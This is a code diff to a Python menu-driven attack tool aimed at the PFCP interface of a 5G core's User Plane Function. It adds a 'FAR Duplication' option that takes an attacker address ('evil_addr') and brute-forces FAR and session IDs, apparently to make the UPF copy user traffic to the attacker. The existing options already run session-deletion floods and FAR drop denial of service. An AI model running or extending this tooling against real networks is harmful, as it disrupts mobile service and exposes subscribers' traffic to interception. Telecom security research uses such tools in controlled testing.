@@ -55,6 +55,7 @@ def main():
     print("[2]  PFCP Session Deletion Flood")
     print("[3]  PFCP Session Deletion Targeted")
     print("[4]  PFCP Session Modification FAR Drop")
+    print("[5]  PFCP Session Modification FAR Duplication")
     
     usr_input = input("# ")
     choice = None
@@ -145,7 +146,36 @@ def main():
         
         dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
         dos_obj.Start_pfcp_session_modification_far_drop_bruteforce(far_range=far_range, session_range=session_range)
+    if choice == 5:
+        print("PFCP Session Modification FAR Duplication selected")
+        
+        print(f"Enter your IP address (evil_addr) [default: {EVIL_ADDR}]: ")
+        evil_addr = input("# ") or EVIL_ADDR
+        print(f"Enter the UPF address (upf_addr) [default: {UPF_ADDR}]: ")
+        upf_addr = input("# ") or UPF_ADDR
+        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
+        src_port = int(input("# ") or SRC_PORT)
+        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
+        dest_port = int(input("# ") or DEST_PORT)
+        
+        print("Enter the FAR range: ")
+        far_range = int(input("# "))
+        print("Enter the Session range: ")
+        session_range = int(input("# "))
+        
+        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
+        dos_obj.Start_pfcp_session_modification_far_dupl_bruteforce(
+            far_range=far_range, 
+            session_range=session_range,
+            evil_addr=evil_addr,
+            upf_addr=upf_addr,
+            src_port=src_port,
+            dest_port=dest_port
+        )
+
 
 
 if __name__ == "__main__":
     main()
+    
+    
